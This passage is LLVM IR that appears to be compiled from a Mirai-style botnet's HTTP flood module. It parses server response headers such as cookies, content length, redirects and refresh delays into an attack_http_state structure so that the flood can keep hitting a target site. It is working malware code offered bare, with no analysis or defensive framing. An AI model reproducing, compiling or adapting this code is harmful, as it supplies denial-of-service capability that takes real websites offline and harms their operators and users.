  %446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 11
  store i32 2, i32* %446, align 4
  br label %447

; <label>:447:                                    ; preds = %439, %445
  %448 = call i8* @table_retrieve_val(i32 45, i32* null)
  %449 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %448) #9
  %450 = icmp eq i32 %449, -1
  br i1 %450, label %453, label %451

; <label>:451:                                    ; preds = %447
  %452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 11
  store i32 1, i32* %452, align 4
  br label %453

; <label>:453:                                    ; preds = %447, %451
  %454 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 12
  store i32 0, i32* %454, align 4
  %455 = call i8* @table_retrieve_val(i32 44, i32* null)
  %456 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %455) #9
  %457 = icmp eq i32 %456, -1
  br i1 %457, label %482, label %458

; <label>:458:                                    ; preds = %453
  %459 = call i8* @table_retrieve_val(i32 44, i32* null)
  %460 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %459) #9
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %461
  %463 = load i8, i8* %462, align 1
  %464 = icmp eq i8 %463, 32
  %465 = zext i1 %464 to i32
  %.575 = add nsw i32 %465, %460
  %466 = sext i32 %.575 to i64
  %467 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %466
  %468 = sub nsw i32 %430, %.575
  %469 = call i32 @util_memsearch(i8* %467, i32 %468, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %470 = icmp eq i32 %469, -1
  br i1 %470, label %482, label %471

; <label>:471:                                    ; preds = %458
  %472 = icmp sgt i32 %469, 1
  %473 = add nsw i32 %469, -2
  %.576 = select i1 %472, i32 %473, i32 %469
  %474 = add nsw i32 %.575, %.576
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %475
  store i8 0, i8* %476, align 1
  %477 = call i32 @util_strlen(i8* %467) #9
  %478 = call i8* @table_retrieve_val(i32 43, i32* null)
  %479 = call i32 @util_stristr(i8* %467, i32 %477, i8* %478) #9
  %480 = icmp eq i32 %479, 0
  br i1 %480, label %482, label %481

; <label>:481:                                    ; preds = %471
  store i32 1, i32* %454, align 4
  br label %482

; <label>:482:                                    ; preds = %471, %458, %453, %481
  %483 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 13
  store i32 0, i32* %483, align 4
  %484 = call i8* @table_retrieve_val(i32 41, i32* null)
  %485 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %484) #9
  %486 = icmp eq i32 %485, -1
  br i1 %486, label %511, label %487

; <label>:487:                                    ; preds = %482
  %488 = call i8* @table_retrieve_val(i32 41, i32* null)
  %489 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %488) #9
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %490
  %492 = load i8, i8* %491, align 1
  %493 = icmp eq i8 %492, 32
  %494 = zext i1 %493 to i32
  %.577 = add nsw i32 %494, %489
  %495 = sext i32 %.577 to i64
  %496 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %495
  %497 = sub nsw i32 %430, %.577
  %498 = call i32 @util_memsearch(i8* %496, i32 %497, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %499 = icmp eq i32 %498, -1
  br i1 %499, label %511, label %500

; <label>:500:                                    ; preds = %487
  %501 = icmp sgt i32 %498, 1
  %502 = add nsw i32 %498, -2
  %.578 = select i1 %501, i32 %502, i32 %498
  %503 = add nsw i32 %.577, %.578
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %504
  store i8 0, i8* %505, align 1
  %506 = call i32 @util_strlen(i8* %496) #9
  %507 = call i8* @table_retrieve_val(i32 42, i32* null)
  %508 = call i32 @util_stristr(i8* %496, i32 %506, i8* %507) #9
  %509 = icmp eq i32 %508, 0
  br i1 %509, label %511, label %510

; <label>:510:                                    ; preds = %500
  store i32 1, i32* %483, align 4
  br label %511

; <label>:511:                                    ; preds = %500, %487, %482, %510
  %512 = call i8* @table_retrieve_val(i32 40, i32* null)
  %513 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %512) #9
  %514 = icmp eq i32 %513, -1
  br i1 %514, label %.sink.split, label %515

; <label>:515:                                    ; preds = %511
  %516 = call i8* @table_retrieve_val(i32 40, i32* null)
  %517 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %516) #9
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %518
  %520 = load i8, i8* %519, align 1
  %521 = icmp eq i8 %520, 32
  %522 = zext i1 %521 to i32
  %.579 = add nsw i32 %522, %517
  %523 = sext i32 %.579 to i64
  %524 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %523
  %525 = sub nsw i32 %430, %.579
  %526 = call i32 @util_memsearch(i8* %524, i32 %525, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %527 = icmp eq i32 %526, -1
  br i1 %527, label %.preheader609, label %528

; <label>:528:                                    ; preds = %515
  %529 = icmp sgt i32 %526, 1
  %530 = add nsw i32 %526, -2
  %.580 = select i1 %529, i32 %530, i32 %526
  %531 = add nsw i32 %.579, %.580
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %532
  store i8 0, i8* %533, align 1
  %534 = call i32 @util_atoi(i8* %524, i32 10) #9
  br label %.sink.split

.sink.split:                                      ; preds = %511, %528
  %.sink6 = phi i32 [ %534, %528 ], [ 0, %511 ]
  %535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 14
  store i32 %.sink6, i32* %535, align 4
  br label %.preheader609

.preheader609:                                    ; preds = %515, %.sink.split
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 15
  %537 = call i8* @table_retrieve_val(i32 39, i32* null)
  %538 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %537) #9
  %539 = icmp eq i32 %538, -1
  br i1 %539, label %.critedge581, label %.lr.ph645.preheader

.lr.ph645.preheader:                              ; preds = %.preheader609
  br label %.lr.ph645

.lr.ph645:                                        ; preds = %.lr.ph645.preheader, %.loopexit
  %540 = phi i8* [ %.pre689, %.loopexit ], [ %21, %.lr.ph645.preheader ]
  %.0559644 = phi i32 [ %.pre686, %.loopexit ], [ 0, %.lr.ph645.preheader ]
  %541 = load i32, i32* %536, align 4
  %542 = icmp slt i32 %541, 5
  br i1 %542, label %543, label %.critedge581.loopexit

; <label>:543:                                    ; preds = %.lr.ph645
  %544 = call i8* @table_retrieve_val(i32 39, i32* null)
  %545 = call i32 @util_stristr(i8* %540, i32 %430, i8* %544) #9
  %546 = add nsw i32 %545, %.0559644
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %547
  %549 = load i8, i8* %548, align 1
  %550 = icmp eq i8 %549, 32
  %551 = zext i1 %550 to i32
  %.582 = add nsw i32 %551, %545
  %552 = sext i32 %.582 to i64
  %553 = getelementptr inbounds i8, i8* %540, i64 %552
  %554 = sub nsw i32 %430, %.0559644
  %555 = sub i32 %554, %.582
  %556 = call i32 @util_memsearch(i8* %553, i32 %555, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %557 = icmp eq i32 %556, -1
  %.pre686 = add nsw i32 %.582, %.0559644
  %.pre687 = sext i32 %.pre686 to i64
  %.pre689 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %.pre687
  br i1 %557, label %.loopexit, label %558

; <label>:558:                                    ; preds = %543
  %559 = icmp sgt i32 %556, 1
  %560 = add nsw i32 %556, -2
  %.583 = select i1 %559, i32 %560, i32 %556
  %561 = call i32 @util_memsearch(i8* %553, i32 %555, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %562 = icmp sgt i32 %561, 0
  %563 = add nsw i32 %561, -1
  %..583 = select i1 %562, i32 %563, i32 %.583
  %564 = add nsw i32 %..583, %.pre686
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %565
  store i8 0, i8* %566, align 1
  store i32 0, i32* %5, align 4
  %567 = call i32 @util_strlen(i8* nonnull %.pre689) #9
  %568 = icmp sgt i32 %567, 0
  br i1 %568, label %.lr.ph639.preheader, label %._crit_edge640

.lr.ph639.preheader:                              ; preds = %558
  br label %.lr.ph639

; <label>:569:                                    ; preds = %.lr.ph639
  store i32 %577, i32* %5, align 4
  %570 = call i32 @util_strlen(i8* nonnull %.pre689) #9
  %571 = icmp slt i32 %577, %570
  br i1 %571, label %.lr.ph639, label %._crit_edge640.loopexit

.lr.ph639:                                        ; preds = %.lr.ph639.preheader, %569
  %572 = load i32, i32* %5, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds i8, i8* %.pre689, i64 %573
  %575 = load i8, i8* %574, align 1
  %576 = icmp eq i8 %575, 61
  %577 = add nsw i32 %572, 1
  br i1 %576, label %._crit_edge640.loopexit, label %569

._crit_edge640.loopexit:                          ; preds = %.lr.ph639, %569
  br label %._crit_edge640

._crit_edge640:                                   ; preds = %._crit_edge640.loopexit, %558
  %578 = load i32, i32* %5, align 4
  %579 = sext i32 %578 to i64
  %580 = getelementptr inbounds i8, i8* %.pre689, i64 %579
  %581 = load i8, i8* %580, align 1
  %582 = icmp eq i8 %581, 61
  br i1 %582, label %.preheader, label %.loopexit

.preheader:                                       ; preds = %._crit_edge640
  store i32 0, i32* %5, align 4
  %583 = load i32, i32* %536, align 4
  %584 = icmp sgt i32 %583, 0
  br i1 %584, label %.lr.ph643.preheader, label %.critedge584

.lr.ph643.preheader:                              ; preds = %.preheader
  br label %.lr.ph643

.lr.ph643:                                        ; preds = %.lr.ph643.preheader, %589
  %storemerge567642 = phi i32 [ %591, %589 ], [ 0, %.lr.ph643.preheader ]
  %585 = sext i32 %storemerge567642 to i64
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %585, i64 0
  %587 = call signext i8 @util_strncmp(i8* %.pre689, i8* %586, i32 %578) #9
  %588 = icmp eq i8 %587, 0
  br i1 %588, label %589, label %.loopexit.loopexit

; <label>:589:                                    ; preds = %.lr.ph643
  %590 = load i32, i32* %5, align 4
  %591 = add nsw i32 %590, 1
  store i32 %591, i32* %5, align 4
  %592 = load i32, i32* %536, align 4
  %593 = icmp slt i32 %591, %592
  br i1 %593, label %.lr.ph643, label %.critedge584.loopexit

.critedge584.loopexit:                            ; preds = %589
  br label %.critedge584

.critedge584:                                     ; preds = %.critedge584.loopexit, %.preheader
  %594 = call i32 @util_strlen(i8* %.pre689) #9
  %595 = icmp slt i32 %594, 128
  br i1 %595, label %596, label %.loopexit

; <label>:596:                                    ; preds = %.critedge584
  %597 = load i32, i32* %536, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %598, i64 0
  %600 = call i32 @util_strcpy(i8* %599, i8* %.pre689) #9
  %601 = load i32, i32* %536, align 4
  %602 = add nsw i32 %601, 1
  store i32 %602, i32* %536, align 4
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph643
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %543, %._crit_edge640, %.critedge584, %596
  %603 = call i8* @table_retrieve_val(i32 39, i32* null)
  %604 = call i32 @util_stristr(i8* %.pre689, i32 %430, i8* %603) #9
  %605 = icmp eq i32 %604, -1
  br i1 %605, label %.critedge581.loopexit, label %.lr.ph645

.critedge581.loopexit:                            ; preds = %.loopexit, %.lr.ph645
  br label %.critedge581

.critedge581:                                     ; preds = %.critedge581.loopexit, %.preheader609
  %606 = call i8* @table_retrieve_val(i32 38, i32* null)
  %607 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %606) #9
  %608 = icmp eq i32 %607, -1
  br i1 %608, label %701, label %609

; <label>:609:                                    ; preds = %.critedge581
  %610 = call i8* @table_retrieve_val(i32 38, i32* null)
  %611 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %610) #9
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %612
  %614 = load i8, i8* %613, align 1
  %615 = icmp eq i8 %614, 32
  %616 = zext i1 %615 to i32
  %.585 = add nsw i32 %616, %611
  %617 = sext i32 %.585 to i64
  %618 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %617
  %619 = sub nsw i32 %430, %.585
  %620 = call i32 @util_memsearch(i8* %618, i32 %619, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %621 = icmp eq i32 %620, -1
  br i1 %621, label %701, label %622

; <label>:622:                                    ; preds = %609
  %623 = icmp sgt i32 %620, 1
  %624 = add nsw i32 %620, -2
  %.586 = select i1 %623, i32 %624, i32 %620
  %625 = add nsw i32 %.585, %.586
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %626
  store i8 0, i8* %627, align 1
  %628 = add nsw i32 %.586, 1
  %629 = call i32 @util_memsearch(i8* %618, i32 %628, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i32 4)
  %630 = icmp eq i32 %629, 4
  br i1 %630, label %631, label %676

; <label>:631:                                    ; preds = %622
  %632 = getelementptr inbounds i8, i8* %618, i64 4
  %633 = load i8, i8* %632, align 1
  %634 = icmp eq i8 %633, 115
  %.587 = select i1 %634, i32 8, i32 7
  store i32 %.587, i32* %5, align 4
  %635 = zext i32 %.587 to i64
  %636 = getelementptr inbounds i8, i8* %618, i64 %635
  %637 = sub nsw i32 %628, %.587
  %638 = sext i32 %637 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %618, i8* %636, i64 %638, i32 1, i1 false)
  br label %639

; <label>:639:                                    ; preds = %644, %631
  %indvars.iv673 = phi i64 [ %indvars.iv.next674, %644 ], [ 0, %631 ]
  %640 = getelementptr inbounds i8, i8* %618, i64 %indvars.iv673
  %641 = load i8, i8* %640, align 1
  switch i8 %641, label %644 [
    i8 0, label %.loopexit608
    i8 47, label %642
  ]

; <label>:642:                                    ; preds = %639
  %643 = trunc i64 %indvars.iv673 to i32
  store i32 %643, i32* %5, align 4
  store i8 0, i8* %640, align 1
  br label %646

; <label>:644:                                    ; preds = %639
  %indvars.iv.next674 = add nuw i64 %indvars.iv673, 1
  br label %639

.loopexit608:                                     ; preds = %639
  %645 = trunc i64 %indvars.iv673 to i32
  store i32 %645, i32* %5, align 4
  br label %646

; <label>:646:                                    ; preds = %.loopexit608, %642
  %647 = call i32 @util_strlen(i8* nonnull %618) #9
  %648 = icmp sgt i32 %647, 0
  br i1 %648, label %649, label %655

; <label>:649:                                    ; preds = %646
  %650 = call i32 @util_strlen(i8* nonnull %618) #9
  %651 = icmp slt i32 %650, 128
  br i1 %651, label %652, label %655

; <label>:652:                                    ; preds = %649
  %653 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 7, i64 0
  %654 = call i32 @util_strcpy(i8* %653, i8* nonnull %618) #9
  br label %655

; <label>:655:                                    ; preds = %652, %649, %646
  %656 = load i32, i32* %5, align 4
  %657 = add nsw i32 %656, 1
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds i8, i8* %618, i64 %658
  %660 = call i32 @util_strlen(i8* %659) #9
  %661 = icmp slt i32 %660, 256
  br i1 %661, label %662, label %700

; <label>:662:                                    ; preds = %655
  %663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %663, i32 255) #9
  %664 = load i32, i32* %5, align 4
  %665 = add nsw i32 %664, 1
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds i8, i8* %618, i64 %666
  %668 = call i32 @util_strlen(i8* %667) #9
  %669 = icmp sgt i32 %668, 0
  br i1 %669, label %670, label %700

; <label>:670:                                    ; preds = %662
  %671 = load i32, i32* %5, align 4
  %672 = add nsw i32 %671, 1
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds i8, i8* %618, i64 %673
  %675 = call i32 @util_strcpy(i8* %663, i8* %674) #9
  br label %700

; <label>:676:                                    ; preds = %622
  %677 = load i8, i8* %618, align 1
  %678 = icmp eq i8 %677, 47
  br i1 %678, label %679, label %700

; <label>:679:                                    ; preds = %676
  %680 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %680, i32 255) #9
  %681 = load i32, i32* %5, align 4
  %682 = add nsw i32 %681, 1
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds i8, i8* %618, i64 %683
  %685 = call i32 @util_strlen(i8* %684) #9
  %686 = icmp sgt i32 %685, 0
  br i1 %686, label %687, label %700

; <label>:687:                                    ; preds = %679
  %688 = load i32, i32* %5, align 4
  %689 = add nsw i32 %688, 1
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8, i8* %618, i64 %690
  %692 = call i32 @util_strlen(i8* %691) #9
  %693 = icmp slt i32 %692, 256
  br i1 %693, label %694, label %700

; <label>:694:                                    ; preds = %687
  %695 = load i32, i32* %5, align 4
  %696 = add nsw i32 %695, 1
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8, i8* %618, i64 %697
  %699 = call i32 @util_strcpy(i8* %680, i8* %698) #9
  br label %700

; <label>:700:                                    ; preds = %676, %694, %687, %679, %655, %670, %662
  store i8 1, i8* %417, align 4
  br label %.loopexit611

; <label>:701:                                    ; preds = %609, %.critedge581
  %702 = call i8* @table_retrieve_val(i32 37, i32* null)
  %703 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %702) #9
  %704 = icmp eq i32 %703, -1
  br i1 %704, label %864, label %705

; <label>:705:                                    ; preds = %701
  %706 = call i8* @table_retrieve_val(i32 37, i32* null)
  %707 = call i32 @util_stristr(i8* nonnull %21, i32 %430, i8* %706) #9
  %708 = sext i32 %707 to i64
  %709 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %708
  %710 = load i8, i8* %709, align 1
  %711 = icmp eq i8 %710, 32
  %712 = zext i1 %711 to i32
  %.588 = add nsw i32 %712, %707
  %713 = sext i32 %.588 to i64
  %714 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %713
  %715 = sub nsw i32 %430, %.588
  %716 = call i32 @util_memsearch(i8* %714, i32 %715, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %717 = icmp eq i32 %716, -1
  br i1 %717, label %864, label %718

; <label>:718:                                    ; preds = %705
  %719 = icmp sgt i32 %716, 1
  %720 = add nsw i32 %716, -2
  %.589 = select i1 %719, i32 %720, i32 %716
  %721 = add nsw i32 %.588, %.589
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %722
  store i8 0, i8* %723, align 1
  br label %724

; <label>:724:                                    ; preds = %724, %718
  %indvars.iv675 = phi i64 [ %indvars.iv.next676, %724 ], [ 0, %718 ]
  %725 = getelementptr inbounds i8, i8* %714, i64 %indvars.iv675
  %726 = load i8, i8* %725, align 1
  %.off605 = add i8 %726, -48
  %727 = icmp ult i8 %.off605, 10
  %indvars.iv.next676 = add nuw i64 %indvars.iv675, 1
  br i1 %727, label %724, label %.critedge

.critedge:                                        ; preds = %724
  %728 = add nsw i32 %.589, 1
  %729 = trunc i64 %indvars.iv675 to i32
  store i32 %729, i32* %5, align 4
  %730 = icmp eq i8 %726, 0
  br i1 %730, label %864, label %731

; <label>:731:                                    ; preds = %.critedge
  store i8 0, i8* %725, align 1
  %732 = add nsw i32 %729, 1
  store i32 %732, i32* %5, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %714, i64 %733
  %735 = load i8, i8* %734, align 1
  %736 = icmp eq i8 %735, 32
  br i1 %736, label %737, label %739

; <label>:737:                                    ; preds = %731
  %738 = add nsw i32 %729, 2
  store i32 %738, i32* %5, align 4
  br label %739

; <label>:739:                                    ; preds = %737, %731
  %740 = phi i32 [ %738, %737 ], [ %732, %731 ]
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds i8, i8* %714, i64 %741
  %743 = call i32 @util_strlen(i8* %742) #9
  %744 = call i32 @util_stristr(i8* %742, i32 %743, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #9
  %745 = icmp eq i32 %744, -1
  %.pre685 = load i32, i32* %5, align 4
  br i1 %745, label %._crit_edge684, label %746

; <label>:746:                                    ; preds = %739
  %747 = sext i32 %.pre685 to i64
  %748 = getelementptr inbounds i8, i8* %714, i64 %747
  %749 = call i32 @util_strlen(i8* %748) #9
  %750 = call i32 @util_stristr(i8* %748, i32 %749, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #9
  %751 = load i32, i32* %5, align 4
  %752 = add nsw i32 %751, %750
  store i32 %752, i32* %5, align 4
  br label %._crit_edge684

._crit_edge684:                                   ; preds = %739, %746
  %753 = phi i32 [ %752, %746 ], [ %.pre685, %739 ]
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds i8, i8* %714, i64 %754
  %756 = load i8, i8* %755, align 1
  %757 = icmp eq i8 %756, 34
  br i1 %757, label %758, label %776

; <label>:758:                                    ; preds = %._crit_edge684
  %759 = add nsw i32 %753, 1
  store i32 %759, i32* %5, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds i8, i8* %714, i64 %760
  %762 = call i32 @util_strlen(i8* %761) #9
  %763 = add nsw i32 %762, -1
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds i8, i8* %761, i64 %764
  %766 = load i8, i8* %765, align 1
  %767 = icmp eq i8 %766, 34
  br i1 %767, label %768, label %776

; <label>:768:                                    ; preds = %758
  %769 = load i32, i32* %5, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds i8, i8* %714, i64 %770
  %772 = call i32 @util_strlen(i8* %771) #9
  %773 = add nsw i32 %772, -1
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds i8, i8* %771, i64 %774
  store i8 0, i8* %775, align 1
  br label %776

; <label>:776:                                    ; preds = %758, %768, %._crit_edge684
  %777 = call i32 @util_atoi(i8* nonnull %714, i32 10) #9
  %778 = add i32 %777, %379
  %779 = zext i32 %778 to i64
  %.off = add i32 %777, -1
  %780 = icmp ult i32 %.off, 9
  br i1 %780, label %.lr.ph649.preheader, label %.critedge12

.lr.ph649.preheader:                              ; preds = %776
  %781 = call i64 @time(i64* null) #9
  %782 = icmp sgt i64 %779, %781
  br i1 %782, label %.lr.ph649.preheader726, label %.critedge12

.lr.ph649.preheader726:                           ; preds = %.lr.ph649.preheader
  br label %.lr.ph649

.lr.ph649:                                        ; preds = %.lr.ph649.preheader726, %.lr.ph649
  %783 = call i32 @sleep(i32 1) #9
  %784 = call i64 @time(i64* null) #9
  %785 = icmp sgt i64 %779, %784
  br i1 %785, label %.lr.ph649, label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.lr.ph649
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %.lr.ph649.preheader, %776
  %786 = load i32, i32* %5, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %714, i64 %787
  %789 = call i32 @util_strlen(i8* %788) #9
  %790 = call i32 @util_stristr(i8* %788, i32 %789, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #9
  %791 = icmp eq i32 %790, 4
  br i1 %791, label %792, label %837

; <label>:792:                                    ; preds = %.critedge12
  %793 = getelementptr inbounds i8, i8* %788, i64 4
  %794 = load i8, i8* %793, align 1
  %795 = icmp eq i8 %794, 115
  %.592 = select i1 %795, i32 8, i32 7
  store i32 %.592, i32* %5, align 4
  %796 = zext i32 %.592 to i64
  %797 = getelementptr inbounds i8, i8* %788, i64 %796
  %798 = sub i32 %728, %.592
  %799 = sext i32 %798 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %788, i8* %797, i64 %799, i32 1, i1 false)
  br label %800

; <label>:800:                                    ; preds = %805, %792
  %indvars.iv677 = phi i64 [ %indvars.iv.next678, %805 ], [ 0, %792 ]
  %801 = getelementptr inbounds i8, i8* %788, i64 %indvars.iv677
  %802 = load i8, i8* %801, align 1
  switch i8 %802, label %805 [
    i8 0, label %.loopexit607
    i8 47, label %803
  ]

; <label>:803:                                    ; preds = %800
  %804 = trunc i64 %indvars.iv677 to i32
  store i32 %804, i32* %5, align 4
  store i8 0, i8* %801, align 1
  br label %807

; <label>:805:                                    ; preds = %800
  %indvars.iv.next678 = add nuw i64 %indvars.iv677, 1
  br label %800

.loopexit607:                                     ; preds = %800
  %806 = trunc i64 %indvars.iv677 to i32
  store i32 %806, i32* %5, align 4
  br label %807

; <label>:807:                                    ; preds = %.loopexit607, %803
  %808 = call i32 @util_strlen(i8* nonnull %788) #9
  %809 = icmp sgt i32 %808, 0
  br i1 %809, label %810, label %816

; <label>:810:                                    ; preds = %807
  %811 = call i32 @util_strlen(i8* nonnull %788) #9
  %812 = icmp slt i32 %811, 128
  br i1 %812, label %813, label %816

; <label>:813:                                    ; preds = %810
  %814 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 7, i64 0
  %815 = call i32 @util_strcpy(i8* %814, i8* nonnull %788) #9
  br label %816

; <label>:816:                                    ; preds = %813, %810, %807
  %817 = load i32, i32* %5, align 4
  %818 = add nsw i32 %817, 1
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds i8, i8* %788, i64 %819
  %821 = call i32 @util_strlen(i8* %820) #9
  %822 = icmp slt i32 %821, 256
  br i1 %822, label %823, label %861

; <label>:823:                                    ; preds = %816
  %824 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %824, i32 255) #9
  %825 = load i32, i32* %5, align 4
  %826 = add nsw i32 %825, 1
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds i8, i8* %788, i64 %827
  %829 = call i32 @util_strlen(i8* %828) #9
  %830 = icmp sgt i32 %829, 0
  br i1 %830, label %831, label %861

; <label>:831:                                    ; preds = %823
  %832 = load i32, i32* %5, align 4
  %833 = add nsw i32 %832, 1
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds i8, i8* %788, i64 %834
  %836 = call i32 @util_strcpy(i8* %824, i8* %835) #9
  br label %861

; <label>:837:                                    ; preds = %.critedge12
  %838 = load i8, i8* %788, align 1
  %839 = icmp eq i8 %838, 47
  br i1 %839, label %840, label %861

; <label>:840:                                    ; preds = %837
  %841 = load i32, i32* %5, align 4
  %842 = add nsw i32 %841, 1
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds i8, i8* %788, i64 %843
  %845 = call i32 @util_strlen(i8* %844) #9
  %846 = icmp slt i32 %845, 256
  br i1 %846, label %847, label %861

; <label>:847:                                    ; preds = %840
  %848 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 6, i64 1
  call void @util_zero(i8* %848, i32 255) #9
  %849 = load i32, i32* %5, align 4
  %850 = add nsw i32 %849, 1
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds i8, i8* %788, i64 %851
  %853 = call i32 @util_strlen(i8* %852) #9
  %854 = icmp sgt i32 %853, 0
  br i1 %854, label %855, label %861

; <label>:855:                                    ; preds = %847
  %856 = load i32, i32* %5, align 4
  %857 = add nsw i32 %856, 1
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds i8, i8* %788, i64 %858
  %860 = call i32 @util_strcpy(i8* %848, i8* %859) #9
  br label %861

; <label>:861:                                    ; preds = %837, %847, %855, %840, %816, %831, %823
  %862 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 9, i64 0
  %863 = bitcast i8* %862 to i32*
  store i32 5522759, i32* %863, align 1
  store i8 10, i8* %417, align 4
  br label %.loopexit611

; <label>:864:                                    ; preds = %.critedge, %705, %701
  %865 = call i32 @util_memsearch(i8* nonnull %21, i32 %430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4)
  %866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 9, i64 0
  %867 = call signext i8 @util_strcmp(i8* %866, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #9
  %868 = icmp eq i8 %867, 0
  br i1 %868, label %869, label %874

